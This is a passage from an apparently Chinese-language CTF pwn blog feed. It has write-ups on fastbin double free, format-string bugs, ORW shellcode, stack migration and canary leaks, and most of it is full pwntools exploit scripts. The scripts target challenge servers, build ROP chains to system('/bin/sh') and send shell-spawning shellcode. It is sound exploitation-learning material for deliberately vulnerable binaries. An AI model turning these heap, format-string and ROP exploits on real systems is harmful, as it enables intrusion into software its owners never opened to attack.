class="hljs-comment"># Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else</span><br>leak = u64(dump(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>libc = leak - elf.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x68</span><br>system = libc + <span class="hljs-number">0x4526a</span><br>malloc_hook = libc + elf.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc + elf.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>log.info(<span class="hljs-string">&quot;Leak is:        &quot;</span> + <span class="hljs-built_in">hex</span>(leak))<br>log.info(<span class="hljs-string">&quot;System is:      &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>log.info(<span class="hljs-string">&quot;Free hook is:   &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>log.info(<span class="hljs-string">&quot;Malloc hook is: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>log.info(<span class="hljs-string">&quot;Fake chunk is:  &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br>log.info(<span class="hljs-string">&quot;libc is:        &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br><br><span class="hljs-comment"># Free the first chunk to make room for the double free/fastbin duplicaion</span><br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Allocate the next four chunks, chunk 5 will directly overlap with chunk 0 and both chunks will have the same pointer</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment"># Chunk 1</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 2</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 5</span><br><br><span class="hljs-comment"># Commence the double free by freeing 5 then 0, and 4 in between to stop a crash</span><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># Allocate 2 chunks, fill in the chunk that was freed twice with the fake chunk, allocate that chunk again to add the fake chunk to the free list</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 5</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, p64(fake_chunk) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">b&#x27;y&#x27;</span>*<span class="hljs-number">0x50</span>)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 0</span><br><br><span class="hljs-comment"># Allocate the fake chunk, and write over the malloc hook with the One Shot Gadget</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 6</span><br>fill(<span class="hljs-number">6</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x13</span> + p64(system))<br><br><span class="hljs-comment"># Trigger a Malloc call to trigger the malloc hook, and pop a shell</span><br>target.sendline(<span class="hljs-string">b&#x27;1\n1\n&#x27;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br><br><span class="hljs-comment"># Drop to an interactive shell to use the shell</span><br>target.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastbin Attack</title>
    <link href="/2023/10/24/ctf-pwn/Fastbin%20Attack/"/>
    <url>/2023/10/24/ctf-pwn/Fastbin%20Attack/</url>
    
    <content type="html"><![CDATA[<h4 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h4><h5 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h5><p>以buuoj NewStarCTF 2023 week 4 Double为例</p><p>目的是向任意地址写入值</p><p>经典的网图</p><p><img src="/img/Fastbin/1.jpg"></p><p>原理在于，三次free之后，第一次把chunk1 malloc出来之后，可以对content部分进行编辑，而content对于第三次malloc出来的chunk1是fd，这个fd在第四次malloc时，会从自己写的地址进行malloc，然后这个malloc出来的块的content又是可编辑的。这样就实现了任意地址写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./Double&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25942</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x080486B5&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, content</span>):<br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input idx\n&quot;</span>)<br>  p.sendline(idx)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input content\n&quot;</span>)<br>  p.sendline(content)<br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input idx\n&quot;</span>)<br>  p.sendline(idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():  <br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>  <br>  <br>add(<span class="hljs-string">b&#x27;1&#x27;</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>)<br>add(<span class="hljs-string">b&#x27;2&#x27;</span>, <span class="hljs-string">b&quot;bbbb&quot;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;1&#x27;</span>, p64(<span class="hljs-number">0x602070</span> - <span class="hljs-number">16</span>))<br><br>add(<span class="hljs-string">b&#x27;2&#x27;</span>, <span class="hljs-string">b&#x27;dddd&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;3&#x27;</span>, <span class="hljs-string">b&#x27;eeee&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;4&#x27;</span>, p64(<span class="hljs-number">1638</span>))<br><br>check()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h5><h5 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h5><h5 id="Arbitary-Alloc"><a href="#Arbitary-Alloc" class="headerlink" title="Arbitary Alloc"></a>Arbitary Alloc</h5>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FormatString</title>
    <link href="/2023/10/23/ctf-pwn/FormatString/"/>
    <url>/2023/10/23/ctf-pwn/FormatString/</url>
    
    <content type="html"><![CDATA[<h4 id="xctf-string"><a href="#xctf-string" class="headerlink" title="xctf string"></a>xctf string</h4><p><img src="/img/FormatString/1.png"></p><p>简单的格式化字符串</p><p>这道题目需要注意的点包括</p><ol><li><p>题目中用%x打印出来的地址，可以直接用<code>int(...,16)</code>来接收，不要用ljust那一套。。。（-_-||</p></li><li><p>在利用格式化字符串漏洞的时候，如果用<code>p64(addr)  + %n(或者%p)...</code>时，要先保证addr没有<code>\0</code></p><p>就像这道题，我一开始就非得不用它那个%ld输入要写入的地址，就非要把x[0]的地址和后面那一串一起写进去，后果就是print(format)时候根本不会打印aaaa…..和%n，因为地址里有\0，直接停止了😭还在那看了好半天是不是地址的格式问题</p></li><li><p><code>shellcraft.sh</code>用之前**一定要先指定平台 **<code> context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)</code></p></li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;)</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">58702</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>e = ELF(<span class="hljs-string">&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x400d36&quot;)</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;secret[0] is &quot;</span>)<br>x0 = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;What should your character&#x27;s name be:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;123&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;So, where you will go?east or up?:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;east&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;go into there(1), or leave(0)?:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;And, you wish is:\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">85</span> + <span class="hljs-string">b&quot;%7$n&quot;</span><br><span class="hljs-comment">#payload = b&#x27;aaaaaaaa&#x27; + b&quot;%p%p%p%p-%p%p%p%p-%p%p%p%p-%p%p%p%p&quot;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;That&#x27;s sound terrible! you meet final boss!but you level is ONE!\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)<br><br><span class="hljs-comment">#shellcode = &#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br><br>shellcode = asm(shellcraft.sh())<br><br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h4><p><a href="https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting">https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting</a></p><p>本地运行不起来，不知道是什么原因。</p><p>直接在栈上泄露返回<code>__libc_start_main</code>的偏移地址，算出libc</p><p>参考 <a href="https://blog.csdn.net/mcmuyanga/article/details/114643601">https://blog.csdn.net/mcmuyanga/article/details/114643601</a></p><p><img src="/img/FormatString/2.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">r.recvuntil(<span class="hljs-string">&quot;&gt; Input your code please:&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;OreOOrereOOreO%17$p&quot;</span>)<span class="hljs-comment">#elf 11 libc 17</span><br><br>r.recvuntil(<span class="hljs-string">&quot;#######################\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;# Your Code is &quot;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>start_main = <span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0xf0</span><br>libc.address = start_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>orw</title>
    <link href="/2023/10/18/ctf-pwn/orw/"/>
    <url>/2023/10/18/ctf-pwn/orw/</url>
    
    <content type="html"><![CDATA[<h5 id="安装seccomp"><a href="#安装seccomp" class="headerlink" title="安装seccomp"></a>安装seccomp</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install gcc ruby-dev<br>gem install seccomp-tools<br></code></pre></td></tr></table></figure><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad</a></p><p><img src="/img/orw/1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./bad&quot;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28003</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp = <span class="hljs-number">0x400A01</span><br>orw_payload = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)<br>orw_payload += shellcraft.read(<span class="hljs-number">3</span>, mmap, <span class="hljs-number">0x50</span>)<br>orw_payload += shellcraft.write(<span class="hljs-number">1</span>, mmap,<span class="hljs-number">0x50</span>)<br><br>payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Easy shellcode, have fun!&#x27;</span>)<br>p.sendline(payload)<br><br>shellcode=asm(orw_payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stack Migration</title>
    <link href="/2023/10/11/ctf-pwn/stack_migration/"/>
    <url>/2023/10/11/ctf-pwn/stack_migration/</url>
    
    <content type="html"><![CDATA[<h3 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h3><h4 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h4><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_2">https://buuoj.cn/challenges#ciscn_2019_es_2</a></p><p><img src="/img/stack_migration/1.jpg"></p><p>溢出的长度不足以写rop链，劫持rbp到一个足够大的空间里去</p><p>首先通过调试查看ebp到可输入空间开头的距离</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gdb.attach(p, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <span class="hljs-comment"># 在python pwntools里下断点的方法（要放在开头），进去按一下c</span><br></code></pre></td></tr></table></figure><p><img src="/img/stack_migration/2.jpg"></p><p>程序输出的rbp为<code>0xffdb7098</code>，和图中aaaa的位置相差0x38，一会就要将ebp覆盖为ebp-0x38，从而开辟足够的空间来构造rop</p><p>然后<code>vul()</code>函数原本的返回地址被<code>&amp;(leave ret)</code>取代了这样在<code>vul()</code>执行结束时，相当于多执行一次leave ret</p><p>过程如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">1</span>. vul()原本的<span class="hljs-keyword">leave</span><br><span class="hljs-built_in">esp</span>-&gt;<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x38</span>   <span class="hljs-built_in">ebp</span>-&gt;aaaa   <span class="hljs-built_in">esp</span>-&gt;<span class="hljs-keyword">leave</span> <span class="hljs-keyword">ret</span><br><span class="hljs-number">2</span>. vul()原本的<span class="hljs-keyword">ret</span><br><span class="hljs-built_in">eip</span>-&gt;<span class="hljs-keyword">leave</span> <span class="hljs-keyword">ret</span>  <span class="hljs-built_in">esp</span>-&gt;比返回地址再低<span class="hljs-number">4</span>个字节的位置上<br><span class="hljs-number">3</span>. <span class="hljs-keyword">leave</span><br><span class="hljs-built_in">esp</span>-&gt;aaaa    <span class="hljs-built_in">ebp</span> == aaaa  <span class="hljs-built_in">esp</span>-&gt;system@plt<br><span class="hljs-number">4</span>. <span class="hljs-keyword">ret</span> <br><span class="hljs-built_in">eip</span>-&gt;system@plt   <span class="hljs-built_in">esp</span>-&gt;system的返回地址（瞎写的）<br></code></pre></td></tr></table></figure><p>这时，就相当于一个普通的rop了，system@plt为一个被溢出的返回地址，在他后面的是system的返回地址和它的参数，而”/bin/sh\x00”为一个字符串，需要一个指针指向它，因此需要计算一下binsh的地址。</p><p>由于aaaa是ebp-0x38，binsh距离aaaa有16个字节，那么这个地方填上ebp-0x28，就能给system传进去binsh的参数了。</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./ciscn_2019_es_2&quot;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25391)</span><br>gdb.attach(r, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <br>sys=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x08048562</span><br>main=<span class="hljs-number">0xdeadbeef</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span>+<span class="hljs-string">&#x27;b&#x27;</span><br>r.send(payload)<br>r.recvuntil(<span class="hljs-string">&quot;b&quot;</span>)<br>ebp = u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(ebp-<span class="hljs-number">0x38</span>)+p32(leave_ret)<br><br>r.send(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="NewStarCTF-2023"><a href="#NewStarCTF-2023" class="headerlink" title="NewStarCTF 2023"></a>NewStarCTF 2<strong>023</strong></h4><p>stack migration</p><p><img src="/img/stack_migration/3.jpg"></p><p>和前面的唯一区别在于需要先泄露libc地址，题目又给了libc</p><p>需要注意的还是不要sendline，因为会多一个\n，占掉了下一次输入，payload2就输入不进去了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25029</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x4012a9&quot;)</span><br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment">#context.log_level=&quot;debug&quot;</span><br><br>leave_ret = <span class="hljs-number">0x4012aa</span><br>poprdi_ret = <span class="hljs-number">0x401333</span><br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-comment">#main = e.sym[&quot;main&quot;]</span><br>main = <span class="hljs-number">0x4012ac</span><br>start = <span class="hljs-number">0x4010b0</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;your name:\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;12345678&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;I have a small gift for you: &quot;</span>)<br>buf_addr = <span class="hljs-built_in">eval</span>(p.recv(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(buf_addr))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;more infomation plz:\n&quot;</span>)<br>payload2 = ( p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)).ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload2+= p64(buf_addr) + p64(leave_ret)<br>p.send(payload2)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts:----&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br><br>libc = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>libc.address =  puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;your name:\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;12345678&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;I have a small gift for you: &quot;</span>)<br>buf_addr = <span class="hljs-built_in">eval</span>(p.recv(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(buf_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;more infomation plz:\n&quot;</span>)<br>payload2 = (p64(poprdi_ret) + p64(binsh) + p64(system)).ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>payload2+= p64(buf_addr) + p64(leave_ret)<br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>canary</title>
    <link href="/2023/10/11/ctf-pwn/canary/"/>
    <url>/2023/10/11/ctf-pwn/canary/</url>
    
    <content type="html"><![CDATA[<h3 id="canary泄露"><a href="#canary泄露" class="headerlink" title="canary泄露"></a>canary泄露</h3><p>NewStarCTF 2023 canary：</p><p><img src="/img/canary/1.jpg"></p><p><code>__readfsqword(0x28u)</code>说明添加了canary，但是第一次输入只能输入32字节，距离把canary一块printf出来差了8字节，因此用格式化字符串漏洞把canary打印出来。</p><p><code>printf</code>的参数中，rdi为第一次输入的格式化字符串，然后需要5个%p把rsi，rdx，rcx，r8，r9略过，然后再来6个%p（因为后面的参数在栈上，而canary是栈上第41-48字节，需要第六个%p才能将其打印出来）</p><p>然后第二次输入就是一个最简单的rop链了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 